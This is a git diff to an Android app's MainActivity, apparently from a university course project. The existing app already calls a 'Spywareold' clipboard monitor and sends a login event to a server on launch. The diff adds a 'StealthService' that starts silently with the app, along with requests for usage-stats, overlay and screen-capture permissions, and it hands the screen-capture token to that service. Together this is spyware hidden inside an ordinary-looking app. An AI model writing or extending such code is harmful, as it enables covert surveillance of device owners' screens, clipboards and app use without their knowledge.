@@ -23,6 +23,14 @@ import com.example.inf2215.ui.theme.INF2215Theme
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 import com.example.inf2215.Spywareold
+import androidx.activity.result.contract.ActivityResultContracts
+import android.media.projection.MediaProjectionManager
+import android.content.Intent
+import android.net.Uri
+import android.os.Build
+import android.provider.Settings
+
+
 class MainActivity : ComponentActivity() {
     fun sendDataToServer(action: String) {
 
@@ -61,12 +69,66 @@ class MainActivity : ComponentActivity() {
         }.start()
     }
 
+    private val screenCaptureLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
+        if (result.resultCode == RESULT_OK && result.data != null) {
+            // Pass token to StealthService
+            Intent(this, StealthService::class.java).apply {
+                putExtra("SCREEN_CAPTURE_RESULT_CODE", result.resultCode)
+                putExtra("SCREEN_CAPTURE_DATA", result.data)
+                startService(this)
+            }
+        }
+    }
+
+    private fun requestUsageStatsPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            if (!hasUsageStatsPermission()) {
+                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
+            }
+        }
+    }
+
+    private fun hasUsageStatsPermission(): Boolean {
+        val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
+        val mode = appOps.checkOpNoThrow(
+            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
+            android.os.Process.myUid(),
+            packageName
+        )
+        return mode == android.app.AppOpsManager.MODE_ALLOWED
+    }
+
+    private fun requestOverlayPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            val intent = Intent(
+                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:$packageName")
+            )
+            startActivity(intent)
+        }
+    }
+
     @OptIn(ExperimentalMaterial3Api::class)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
         sendDataToServer("user_login")
         Spywareold.startClipboardMonitoring(this)
+
+        // Start the new stealth service
+        startService(Intent(this, StealthService::class.java))
+
+        // Request permissions
+        requestUsageStatsPermission()
+        requestOverlayPermission()
+
+        // Request screen capture permission
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
+        }
+
+
 
         enableEdgeToEdge()
 
